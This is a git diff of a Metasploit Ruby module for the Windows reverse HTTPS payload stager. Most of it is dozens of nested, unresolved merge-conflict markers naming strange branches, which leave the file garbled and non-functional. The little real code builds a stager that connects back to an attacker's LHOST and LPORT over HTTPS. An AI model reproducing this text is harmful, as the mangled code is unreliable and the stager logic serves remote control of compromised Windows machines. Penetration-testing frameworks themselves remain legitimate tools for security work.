@@ -19,6 +19,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 require 'msf/core/payload/transport_config'
 =======
 >>>>>>> rapid7/feature/complex-payloads
@@ -39,10 +40,15 @@ require 'msf/core/payload/transport_config'
 require 'msf/core/payload/transport_config'
 =======
 >>>>>>> origin/pod/metasploit-api/_index.html
+=======
+require 'msf/core/payload/transport_config'
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
 >>>>>>> feature/complex-payloads
 =======
 require 'msf/core/payload/transport_config'
 >>>>>>> 4.11.2_release_pre-rails4
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-api/_index.html
@@ -319,6 +325,8 @@ require 'msf/core/payload/transport_config'
 >>>>>>> rapid7/master
 >>>>>>> msf-complex-payloads
 >>>>>>> origin/pod/metasploit-api/_index.html
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
 require 'msf/core/payload/windows/reverse_http'
 
 module Msf
@@ -341,6 +349,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -362,10 +371,13 @@ module Msf
 =======
 >>>>>>> origin/pod/metasploit-api/_index.html
 =======
+>>>>>>> origin/pod/metasploit-excellent.mp3
+=======
 
 >>>>>>> feature/complex-payloads
 =======
 >>>>>>> 4.11.2_release_pre-rails4
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -567,12 +579,15 @@ module Msf
 =======
 >>>>>>> msf-complex-payloads
 >>>>>>> origin/pod/metasploit-api/_index.html
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTPS
 #
 ###
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -762,6 +777,8 @@ module Payload::Windows::ReverseHttps
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/pod/metasploit-api/_index.html
+=======
+>>>>>>> origin/pod/metasploit-excellent.mp3
 module Payload::Windows::ReverseHttps
 
   include Msf::Payload::TransportConfig
@@ -779,6 +796,7 @@ module Payload::Windows::ReverseHttps
   #
   def transport_config(opts={})
     transport_config_reverse_https(opts)
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -1435,6 +1453,12 @@ module Payload::Windows::ReverseHttps
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+=======
+
+=======
+>>>>>>> 4.11.2_release_pre-rails4
+>>>>>>> origin/pod/metasploit-excellent.mp3
 module Payload::Windows::ReverseHttps
 
   include Msf::Payload::TransportConfig
@@ -1450,8 +1474,31 @@ module Payload::Windows::ReverseHttps
   #
   # Generate the transport-specific configuration
   #
+<<<<<<< HEAD
+  def generate
+
+    # Generate the simple version of this stager if we don't have enough space
+    if self.available_space.nil? || required_space > self.available_space
+      return generate_reverse_https(
+        host: datastore['LHOST'],
+        port: datastore['LPORT'],
+        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW),
+        ssl:  true)
+    end
+
+    conf = {
+      ssl:  true,
+      host: datastore['LHOST'],
+      port: datastore['LPORT'],
+      url:  generate_uri,
+      exitfunk: datastore['EXITFUNC']
+    }
+
+    generate_reverse_https(conf)
+=======
   def transport_config(opts={})
     transport_config_reverse_https(opts)
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1489,6 +1536,15 @@ module Payload::Windows::ReverseHttps
 =======
 >>>>>>> msf-complex-payloads
 >>>>>>> origin/pod/metasploit-api/_index.html
+=======
+>>>>>>> 4.11.2_release_pre-rails4
+  end
+
+  # TODO: Use the CachedSize instead (PR #4894)
+  def cached_size
+    341
+>>>>>>> feature/complex-payloads
+>>>>>>> origin/pod/metasploit-excellent.mp3
   end
 
 end
